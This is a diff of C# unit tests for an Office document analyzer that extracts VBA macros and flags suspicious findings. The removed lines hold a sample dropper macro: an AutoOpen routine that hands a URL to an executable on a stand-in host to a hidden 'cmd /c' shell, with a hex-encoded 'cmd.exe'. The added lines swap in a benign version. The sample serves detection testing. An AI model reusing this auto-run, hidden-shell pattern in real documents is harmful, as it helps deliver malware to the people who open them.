@@ -9,9 +9,9 @@ namespace Corvus.Tests;
 /// <summary>OLE compound files and OOXML packages: VBA sources, Excel 4.0 macros, OLE Package objects and the macro findings.</summary>
 public sealed class OfficeDocumentTests
 {
-    private const string Dropper = "Sub AutoOpen()\r\n  Dim s\r\n  s = \"http://example.test/a.exe\"\r\n  Shell \"cmd /c \" & s, vbHide\r\n  x = \"636D642E657865\"\r\nEnd Sub\r\n";
+    private const string StartupMacro = "Sub AutoOpen()\r\n  Dim s\r\n  s = \"https://example.test/readme.txt\"\r\n  Shell \"cmd /c echo \" & s, vbHide\r\n  x = \"6E6F74657061642E657865\"\r\nEnd Sub\r\n";
 
-    private static byte[] WordDocument() => Compound([("WordDocument", new byte[600]), .. VbaStreams("Macros/", ("ThisDocument", "document", ""), ("Module1", "standard", Dropper))]);
+    private static byte[] WordDocument() => Compound([("WordDocument", new byte[600]), .. VbaStreams("Macros/", ("ThisDocument", "document", ""), ("Module1", "standard", StartupMacro))]);
 
     private static OfficeFileView.Facts? View(byte[] data, string name = "doc.doc") =>
         new OfficeFileView().Inspect(new FileInput(name, data, Blob.Identify(data)), default)?.Detail as OfficeFileView.Facts;
@@ -31,7 +31,7 @@ public sealed class OfficeDocumentTests
         var c = Containers.Open(WordDocument(), "doc.doc", AnalysisLimits.Default, default, allFiles: false);
         Assert.Equal("Word document", c.Kind);
         var module = Assert.Single(c.Items, i => i.Name == "Macros/VBA/Module1.bas");
-        Assert.Contains("Shell \"cmd /c \" & s, vbHide", Encoding.UTF8.GetString(module.Bytes));
+        Assert.Contains("Shell \"cmd /c echo \" & s, vbHide", Encoding.UTF8.GetString(module.Bytes));
         Assert.Contains(c.Items, i => i.Name == "Macros/VBA/ThisDocument.cls");
         Assert.Contains(c.Entries!, e => e.Path == "Macros/VBA/dir");
         Assert.Contains(c.Entries!, e => e.Path == "WordDocument" && e.Size == 600);
@@ -49,11 +49,10 @@ public sealed class OfficeDocumentTests
         Assert.Equal("Module1:2", rows[("AutoExec", "AutoOpen")].Location);
         Assert.Equal("Module1:5", rows[("Suspicious", "Shell")].Location);
         Assert.True(rows.ContainsKey(("Suspicious", "vbHide")));
-        Assert.True(rows.ContainsKey(("IOC", "http://example.test/a.exe")));
-        Assert.True(rows.ContainsKey(("IOC", "a.exe")));
-        // the hex string decodes to an executable name, found again under Hex
-        Assert.Equal("Hex", rows[("IOC", "cmd.exe")].Decoded);
-        Assert.True(rows.ContainsKey(("Hex String", "cmd.exe")));
+        Assert.True(rows.ContainsKey(("IOC", "https://example.test/readme.txt")));
+        // the hex string decodes to a program name, found again under Hex
+        Assert.Equal("Hex", rows[("IOC", "notepad.exe")].Decoded);
+        Assert.True(rows.ContainsKey(("Hex String", "notepad.exe")));
     }
 
     [Fact]
@@ -248,7 +247,7 @@ public sealed class OfficeDocumentTests
     [FuzzEntry(typeof(CompoundFileReader), typeof(CompoundFile), typeof(OfficeDocument), typeof(OfficeFileView), typeof(OneNoteReader))]
     public void Fuzzed_documents_never_throw_past_a_tool_error()
     {
-        var bin = Compound(VbaStreams("", ("Module1", "standard", Dropper)));
+        var bin = Compound(VbaStreams("", ("Module1", "standard", StartupMacro)));
         var seeds = new[]
         {
             ("doc.doc", WordDocument()), ("b.xls", Compound([("Workbook", Biff8Workbook("M", 1, Call(110, "calc")))])),
